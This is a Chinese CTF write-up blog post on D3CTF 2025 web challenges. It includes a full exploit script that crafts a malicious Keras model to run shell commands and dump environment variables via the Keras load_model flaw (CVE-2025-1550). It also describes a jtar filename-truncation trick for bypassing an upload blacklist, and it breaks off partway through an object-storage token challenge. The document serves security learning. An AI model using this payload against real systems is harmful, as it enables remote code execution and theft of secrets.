@@ -1,0 +1,697 @@
+
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>D3CTF 2025-WP | GSBP&#39;s Blog</title>
+    <meta name="description"
+        content="前言
+跟着Syc打的，web方向差一题ak，算是有点可惜了
+d3model
+题目内就一个app.py
+import keras
+from flask import Flask, request, jsonify
+import os
+
+
+def is_valid_model(modelname):
+    try:
+        keras.models.load_model(modelname)
+    except Exception as e:
+        print(e)
+        return False
+    return True
+
+app = Flask(__name__)
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])
+def index():
+    return open(&#39;index.html&#39;).read()
+
+
+@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])
+def upload_file():
+    if &#39;file&#39; not in request.files:
+        return jsonify({&#39;error&#39;: &#39;No file part&#39;}), 400
+    
+    file = request.files[&#39;file&#39;]
+    
+    if file.filename == &#39;&#39;:
+        return jsonify({&#39;error&#39;: &#39;No selected file&#39;}), 400
+    
+    MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB
+    file.seek(0, os.SEEK_END)
+    file_size = file.tell()
+    file.seek(0)
+    
+    if file_size &gt; MAX_FILE_SIZE:
+        return jsonify({&#39;error&#39;: &#39;File size exceeds 50MB limit&#39;}), 400
+    
+    filepath = os.path.join(&#39;./&#39;, &#39;test.keras&#39;)
+    if os.path.exists(filepath):
+        os.remove(filepath)
+    file.save(filepath)
+    
+    if is_valid_model(filepath):
+        return jsonify({&#39;message&#39;: &#39;Model is valid&#39;}), 200
+    else:
+
+        return jsonify({&#39;error&#39;: &#39;Invalid model file&#39;}), 400
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;, port=5001)
+代码也没啥好审的，很明显就只有一个keras.models.load_model(modelname)能当作sink点，去网上搜一下相关漏洞就能找到现成的payload，题目不出网，外带到index.html即可">
+    <link rel="canonical" href="http://localhost:1313/post/d3ctf2025/" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.4/css/bulma.min.css">
+    
+    <link rel="stylesheet" href="http://localhost:1313/scss/style.min.badf012c7f163854e3d9c3287a1df0863ae1974f62e123bbf1f2948b58ed39cf.css">
+
+    <meta property="og:url" content="http://localhost:1313/post/d3ctf2025/">
+  <meta property="og:site_name" content="GSBP&#39;s Blog">
+  <meta property="og:title" content="D3CTF 2025-WP">
+  <meta property="og:description" content="前言 跟着Syc打的，web方向差一题ak，算是有点可惜了
+d3model 题目内就一个app.py
+import kerasfrom flask import Flask, request, jsonifyimport osdef is_valid_model(modelname):try:keras.models.load_model(modelname)except Exception as e:print(e)return Falsereturn Trueapp = Flask(__name__)@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])def index():return open(&#39;index.html&#39;).read()@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])def upload_file():if &#39;file&#39; not in request.files:return jsonify({&#39;error&#39;: &#39;No file part&#39;}), 400file = request.files[&#39;file&#39;]if file.filename == &#39;&#39;:return jsonify({&#39;error&#39;: &#39;No selected file&#39;}), 400MAX_FILE_SIZE = 50 * 1024 * 1024 # 50MBfile.seek(0, os.SEEK_END)file_size = file.tell()file.seek(0)if file_size &gt; MAX_FILE_SIZE:return jsonify({&#39;error&#39;: &#39;File size exceeds 50MB limit&#39;}), 400filepath = os.path.join(&#39;./&#39;, &#39;test.keras&#39;)if os.path.exists(filepath):os.remove(filepath)file.save(filepath)if is_valid_model(filepath):return jsonify({&#39;message&#39;: &#39;Model is valid&#39;}), 200else:return jsonify({&#39;error&#39;: &#39;Invalid model file&#39;}), 400if __name__ == &#39;__main__&#39;:app.run(host=&#39;0.0.0.0&#39;, port=5001) 代码也没啥好审的，很明显就只有一个keras.models.load_model(modelname)能当作sink点，去网上搜一下相关漏洞就能找到现成的payload，题目不出网，外带到index.html即可">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="D3CTF 2025-WP">
+  <meta name="twitter:description" content="前言 跟着Syc打的，web方向差一题ak，算是有点可惜了
+d3model 题目内就一个app.py
+import kerasfrom flask import Flask, request, jsonifyimport osdef is_valid_model(modelname):try:keras.models.load_model(modelname)except Exception as e:print(e)return Falsereturn Trueapp = Flask(__name__)@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])def index():return open(&#39;index.html&#39;).read()@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])def upload_file():if &#39;file&#39; not in request.files:return jsonify({&#39;error&#39;: &#39;No file part&#39;}), 400file = request.files[&#39;file&#39;]if file.filename == &#39;&#39;:return jsonify({&#39;error&#39;: &#39;No selected file&#39;}), 400MAX_FILE_SIZE = 50 * 1024 * 1024 # 50MBfile.seek(0, os.SEEK_END)file_size = file.tell()file.seek(0)if file_size &gt; MAX_FILE_SIZE:return jsonify({&#39;error&#39;: &#39;File size exceeds 50MB limit&#39;}), 400filepath = os.path.join(&#39;./&#39;, &#39;test.keras&#39;)if os.path.exists(filepath):os.remove(filepath)file.save(filepath)if is_valid_model(filepath):return jsonify({&#39;message&#39;: &#39;Model is valid&#39;}), 200else:return jsonify({&#39;error&#39;: &#39;Invalid model file&#39;}), 400if __name__ == &#39;__main__&#39;:app.run(host=&#39;0.0.0.0&#39;, port=5001) 代码也没啥好审的，很明显就只有一个keras.models.load_model(modelname)能当作sink点，去网上搜一下相关漏洞就能找到现成的payload，题目不出网，外带到index.html即可">
+
+    
+
+</head>
+<body><nav class="navbar is-light" role="navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a href="/" title="home" class="navbar-item">
+                <span class="logo">
+                    <h1>GSBP&#39;s Blog</h1>
+                </span>
+            </a>
+
+            
+            <a id="theme-toggle" class="theme-toggle" href="#">
+                <img src="http://localhost:1313/svg/sun.svg" alt="sun icon" class="theme-icon" />
+            </a>
+
+            <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+            </a>
+        </div>
+
+        <div class="navbar-menu">
+            <div class="navbar-start">
+                
+                <a href="/about" class="navbar-item">About</a>
+                
+                <a href="/post" class="navbar-item">Blog</a>
+                
+                <a href="/categories" class="navbar-item">Categories</a>
+                
+                <a href="/friend" class="navbar-item">Friends</a>
+                
+            </div>
+
+        </div>
+        <div class="search">
+            <div id="fastSearch">
+                <input id="searchInput" tabindex="0" placeholder="Search..">
+                <ul id="searchResults">
+
+                </ul>
+            </div>
+            <a id="search-btn" style="display: inline-block;" href="# ">
+                <div class="icon-search"><svg class="search-svg" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
+            </a>
+        </div>
+
+        <script src="/js/fuse.min.js"></script> 
+        <script src="/js/fastsearch.js"></script>
+
+    </div>
+</nav>
+
+<script>
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        var burger = document.querySelector('.navbar-burger');
+        burger.addEventListener('click', function() {
+            burger.classList.toggle('is-active');
+            document.querySelector('.navbar-menu').classList.toggle('is-active');
+        });
+    });
+
+    
+    function setTheme(theme) {
+        let body = document.body;
+        let themeIcon = document.querySelector(".theme-icon");
+        if (theme === "dark") {
+            body.classList.add("dark-mode");
+            themeIcon.src = "http:\/\/localhost:1313\/svg/moon.svg";
+            themeIcon.alt = "moon icon";
+        } else {
+            body.classList.remove("dark-mode");
+            themeIcon.src = "http:\/\/localhost:1313\/svg/sun.svg";
+            themeIcon.alt = "sun icon";
+        }
+        
+        localStorage.setItem("theme", theme);
+    }
+
+    
+    let theme = localStorage.getItem("theme") || "light";
+    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+    if (isDarkMode) {
+        
+        setTheme('dark');
+
+    } else {
+        
+        setTheme('light');
+    }
+    setTheme(theme);
+
+    
+    document.getElementById("theme-toggle").addEventListener("click", function() {
+        if (theme === "light") {
+            theme = "dark";
+        } else {
+            theme = "light";
+        }
+        setTheme(theme);
+    });
+
+
+
+</script>
+
+</header><main>
+<div class="single-container">
+    <div class="archive">
+        <h1 class="title is-1">D3CTF 2025-WP</h1>
+        <div class="title subtitle heading is-6">
+            <div class="author-info columns is-vcentered">
+                <div class="column">
+                    <div class="columns is-vcentered is-mobile">
+                        
+                        <div class="column is-narrow">
+                            <img src="/img/GSBP.jpg" class="author-image">
+                        </div>
+                        
+                        <div class="column">
+                            <p>GSBP</p>
+                            <p><time>January 1, 0001</time>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <div class="small-categories-container">
+                    <a href="/categories/java%E5%AE%89%E5%85%A8">Java安全</a>, <a href="/categories/wp">WP</a>
+                </div>
+            </div>
+        </div>
+        <div class="content article-content">
+            <div class="toc-container">
+                
+    <div class="post-toc">
+        
+            <aside>
+                <button id="tocButton" ><h4 id="contents" style="margin-left: 1vw;color:rgb(96, 134, 180);margin-bottom: 0;">CONTENTS</h4></button>
+                <div id="hide"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#d3model">d3model</a></li>
+    <li><a href="#d3jtar">d3jtar</a></li>
+    <li><a href="#d3invitation">d3invitation</a></li>
+    <li><a href="#tidy-quic">tidy quic</a></li>
+  </ul>
+</nav></div>
+            </aside>
+        
+    </div><script>
+    
+        let button = document.getElementById('tocButton');
+        let hide = document.getElementById("hide");
+        let contents=document.getElementById("contents");
+        button.addEventListener("click", function() {
+        if (hide.style.display!='block') {
+            hide.style.display='block'
+        } else {
+            hide.style.display='none'
+            contents.style.color='rgb(96, 134, 180)'
+        }
+        });
+    
+
+
+
+
+</script>
+            </div>
+            <h2 id="前言">前言</h2>
+<p>跟着Syc打的，web方向差一题ak，算是有点可惜了</p>
+<h2 id="d3model">d3model</h2>
+<p>题目内就一个app.py</p>
+<pre tabindex="0"><code>import keras
+from flask import Flask, request, jsonify
+import os
+
+
+def is_valid_model(modelname):
+    try:
+        keras.models.load_model(modelname)
+    except Exception as e:
+        print(e)
+        return False
+    return True
+
+app = Flask(__name__)
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])
+def index():
+    return open(&#39;index.html&#39;).read()
+
+
+@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])
+def upload_file():
+    if &#39;file&#39; not in request.files:
+        return jsonify({&#39;error&#39;: &#39;No file part&#39;}), 400
+    
+    file = request.files[&#39;file&#39;]
+    
+    if file.filename == &#39;&#39;:
+        return jsonify({&#39;error&#39;: &#39;No selected file&#39;}), 400
+    
+    MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB
+    file.seek(0, os.SEEK_END)
+    file_size = file.tell()
+    file.seek(0)
+    
+    if file_size &gt; MAX_FILE_SIZE:
+        return jsonify({&#39;error&#39;: &#39;File size exceeds 50MB limit&#39;}), 400
+    
+    filepath = os.path.join(&#39;./&#39;, &#39;test.keras&#39;)
+    if os.path.exists(filepath):
+        os.remove(filepath)
+    file.save(filepath)
+    
+    if is_valid_model(filepath):
+        return jsonify({&#39;message&#39;: &#39;Model is valid&#39;}), 200
+    else:
+
+        return jsonify({&#39;error&#39;: &#39;Invalid model file&#39;}), 400
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;, port=5001)
+</code></pre><p>代码也没啥好审的，很明显就只有一个keras.models.load_model(modelname)能当作sink点，去网上搜一下相关漏洞就能找到现成的payload，题目不出网，外带到index.html即可</p>
+<p><a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a></p>
+<p>exp</p>
+<pre tabindex="0"><code>import os
+import zipfile
+import json
+from keras.models import Sequential
+from keras.layers import Dense
+import numpy as np
+
+model_name = &#34;test.keras&#34;
+
+x_train = np.random.rand(100, 28 * 28)
+y_train = np.random.rand(100)
+
+model = Sequential([Dense(1, activation=&#39;linear&#39;, input_dim=28 * 28)])
+
+model.compile(optimizer=&#39;adam&#39;, loss=&#39;mse&#39;)
+model.fit(x_train, y_train, epochs=5)
+model.save(model_name)
+
+with zipfile.ZipFile(model_name, &#34;r&#34;) as f:
+    config = json.loads(f.read(&#34;config.json&#34;).decode())
+
+config[&#34;config&#34;][&#34;layers&#34;][0][&#34;module&#34;] = &#34;keras.models&#34;
+config[&#34;config&#34;][&#34;layers&#34;][0][&#34;class_name&#34;] = &#34;Model&#34;
+config[&#34;config&#34;][&#34;layers&#34;][0][&#34;config&#34;] = {
+    &#34;name&#34;: &#34;mvlttt&#34;,
+    &#34;layers&#34;: [
+        {
+            &#34;name&#34;: &#34;mvlttt&#34;,
+            &#34;class_name&#34;: &#34;function&#34;,
+            &#34;config&#34;: &#34;Popen&#34;,
+            &#34;module&#34;: &#34;subprocess&#34;,
+            &#34;inbound_nodes&#34;: [{&#34;args&#34;: [[&#34;/bin/bash&#34;, &#34;-c&#34;, &#34;env&gt;&gt;index.html&#34;]], &#34;kwargs&#34;: {&#34;bufsize&#34;: -1}}]
+        }],
+    &#34;input_layers&#34;: [[&#34;mvlttt&#34;, 0, 0]],
+    &#34;output_layers&#34;: [[&#34;mvlttt&#34;, 0, 0]]
+}
+
+with zipfile.ZipFile(model_name, &#39;r&#39;) as zip_read:
+    with zipfile.ZipFile(f&#34;tmp.{model_name}&#34;, &#39;w&#39;) as zip_write:
+        for item in zip_read.infolist():
+            if item.filename != &#34;config.json&#34;:
+                zip_write.writestr(item, zip_read.read(item.filename))
+
+os.remove(model_name)
+os.rename(f&#34;tmp.{model_name}&#34;, model_name)
+
+with zipfile.ZipFile(model_name, &#34;a&#34;) as zf:
+    zf.writestr(&#34;config.json&#34;, json.dumps(config))
+
+print(&#34;[+] Malicious model ready&#34;)
+</code></pre><h2 id="d3jtar">d3jtar</h2>
+<p>给了个war包，直接放在tomcat部署就好</p>
+<p>题目只有一个Controller，逻辑如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Source code recreated from a .class file by IntelliJ IDEA</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// (powered by FernFlower decompiler)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> d3.example.controller;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> d3.example.utils.BackUp;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> d3.example.utils.Upload;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.File;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Arrays;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashSet;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Objects;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Set;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletRequest;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.stereotype.Controller;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.bind.annotation.GetMapping;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.bind.annotation.PostMapping;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.bind.annotation.RequestParam;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.bind.annotation.ResponseBody;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.multipart.MultipartFile;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.ModelAndView;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@Controller</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainController</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">MainController</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@GetMapping</span>({<span style="color:#e6db74">&#34;/view&#34;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> ModelAndView <span style="color:#a6e22e">view</span>(<span style="color:#a6e22e">@RequestParam</span> String page, HttpServletRequest request) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (page.<span style="color:#a6e22e">matches</span>(<span style="color:#e6db74">&#34;^[a-zA-Z0-9-]+$&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            String viewPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/WEB-INF/views/&#34;</span> <span style="color:#f92672">+</span> page <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.jsp&#34;</span>;
+</span></span><span style="display:flex;"><span>            String realPath <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getServletContext</span>().<span style="color:#a6e22e">getRealPath</span>(viewPath);
+</span></span><span style="display:flex;"><span>            File jspFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(realPath);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (realPath <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> jspFile.<span style="color:#a6e22e">exists</span>()) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> ModelAndView(page);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ModelAndView mav <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ModelAndView(<span style="color:#e6db74">&#34;Error&#34;</span>);
+</span></span><span style="display:flex;"><span>        mav.<span style="color:#a6e22e">addObject</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#e6db74">&#34;The file don&#39;t exist.&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> mav;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@PostMapping</span>({<span style="color:#e6db74">&#34;/Upload&#34;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">UploadController</span>(<span style="color:#a6e22e">@RequestParam</span> MultipartFile file) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            String uploadDir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;webapps/ROOT/WEB-INF/views&#34;</span>;
+</span></span><span style="display:flex;"><span>            Set<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> blackList <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashSet(Arrays.<span style="color:#a6e22e">asList</span>(<span style="color:#e6db74">&#34;jsp&#34;</span>, <span style="color:#e6db74">&#34;jspx&#34;</span>, <span style="color:#e6db74">&#34;jspf&#34;</span>, <span style="color:#e6db74">&#34;jspa&#34;</span>, <span style="color:#e6db74">&#34;jsw&#34;</span>, <span style="color:#e6db74">&#34;jsv&#34;</span>, <span style="color:#e6db74">&#34;jtml&#34;</span>, <span style="color:#e6db74">&#34;jhtml&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;xml&#34;</span>, <span style="color:#e6db74">&#34;war&#34;</span>, <span style="color:#e6db74">&#34;jar&#34;</span>));
+</span></span><span style="display:flex;"><span>            String filePath <span style="color:#f92672">=</span> Upload.<span style="color:#a6e22e">secureUpload</span>(file, uploadDir, blackList);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Upload Success: &#34;</span> <span style="color:#f92672">+</span> filePath;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Upload.<span style="color:#a6e22e">UploadException</span> e) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;The file is forbidden: &#34;</span> <span style="color:#f92672">+</span> e;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@PostMapping</span>({<span style="color:#e6db74">&#34;/BackUp&#34;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">BackUpController</span>(<span style="color:#a6e22e">@RequestParam</span> String op) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (Objects.<span style="color:#a6e22e">equals</span>(op, <span style="color:#e6db74">&#34;tar&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                BackUp.<span style="color:#a6e22e">tarDirectory</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;backup.tar&#34;</span>), Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;webapps/ROOT/WEB-INF/views&#34;</span>));
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Success !&#34;</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (IOException var3) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Failure : tar Error&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (Objects.<span style="color:#a6e22e">equals</span>(op, <span style="color:#e6db74">&#34;untar&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                BackUp.<span style="color:#a6e22e">untar</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;webapps/ROOT/WEB-INF/views&#34;</span>), Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;backup.tar&#34;</span>));
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Success !&#34;</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (IOException var4) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Failure : untar Error&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Failure : option Error&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>View接口只能够渲染jsp后缀的文件</p>
+<p>Upload接口能够上传文件，不过有些filter</p>
+<p>BackUP能够使用jtar这个组件对webapps/ROOT/WEB-INF/views目录下的文件打包成tar或者解包</p>
+<blockquote>
+<p>这里有个很误导的地方，也是直接导致我赛中没做出来的原因，就是view接口中的&quot;/WEB-INF/views/&quot; + page + &ldquo;.jsp&rdquo;;和BackUp接口中的webapps/ROOT/WEB-INF/views指的是同一个目录，在比赛期间由于我在Tomcat部署，目录结构如下图，所以我的想法一直都是利用某种方法来进行目录穿越操作，最后复现试了一下远程，发现两个是同一个目录，绷不住了
+
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601192354673.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601192354673.png" alt="image-20250601192354673"  />
+</a>
+</div>
+
+</p>
+</blockquote>
+<p>upload过滤做的很严，基本不可能成功上传,加上题目提醒jtar，那么肯定是jtar这个组件有问题</p>
+<p>jtar在打包的流程是这样的，每个要被打包的文件都是一个Entry的实例，这个Entry包含了这个文件的一些信息，比如大小，名字，权限，还有用户的名字等等</p>
+<p>然后在TarOutputStream中利用putNextEntry将每个实例化好的Entry对象放进Stream中，最后write进文件中</p>
+<p>这里存在漏洞的地方就在putNextEntry中</p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601193028746.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601193028746.png" alt="image-20250601193028746"  />
+</a>
+</div>
+
+</p>
+<p>进入writeEntryHeader</p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601193050427.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601193050427.png" alt="image-20250601193050427"  />
+</a>
+</div>
+
+</p>
+<p>这里获取文件名的Bytes</p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601193117940.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601193117940.png" alt="image-20250601193117940"  />
+</a>
+</div>
+
+</p>
+<p>将文件名的char强制转换为byte并且放到buffer里，这里会导致一种什么情况呢</p>
+<p><strong>java中char的大小在\u0000-\uffff之间，而byte的大小在(-127)-128之间，所以当char的值在257时，被强制转换成byte，则会变成1，即ascii码为1对应的字符</strong></p>
+<p>所以这里的思路也出来了，我们只需要找到超出byte大小限制的一个unicode码就行了</p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601194027724.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601194027724.png" alt="image-20250601194027724"  />
+</a>
+</div>
+
+</p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601194232127.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601194232127.png" alt="image-20250601194232127"  />
+</a>
+</div>
+
+</p>
+<p>然后进行一轮tar和untar，最后得到下面这个结果</p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601194225183.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601194225183.png" alt="image-20250601194225183"  />
+</a>
+</div>
+
+</p>
+<p>所以解出思路大致就是这样，附一张解出图</p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601194345147.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601194345147.png" alt="image-20250601194345147"  />
+</a>
+</div>
+
+</p>
+<h2 id="d3invitation">d3invitation</h2>
+<p>环境有两个，一个oss端，一个web端</p>
+<p>Web端这边测端口一共测出来三个</p>
+<ul>
+<li>/api/genSTSCreds	生成AK,SK还有session_token</li>
+<li>/api/putObject              拿着上面生成的凭证往储存桶里放object</li>
+<li>/api/putObject              读取桶下的object</li>
+<li>/invitation                      没啥吊用，生成邀请函的页面</li>
+</ul>
+<p>这里token我们可以解一下里面的内容</p>
+<p>jwt.io</p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601200703515.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601200703515.png" alt="image-20250601200703515"  />
+</a>
+</div>
+
+</p>
+<p>可以看到一个叫sessionPolicy的东西</p>
+<p>
+<div class="post-img-view">
+<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601200730921.png">
+<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250601200730921.png" alt="image-20250601200730921"  />
+</a>
+</div>
+
+</p>
+<p>定义了我们的一些policy，以及可读的权限只有我们上传的文件</p>
+<p>那这里我们可以猜测，flag就在桶之中，我们需要获取到一定的权限去读这个flag</p>
+<p>那我们这里需要获得一个够权限的token，要么是获得他token的key值，要么就是让他生成一个够权限的token</p>
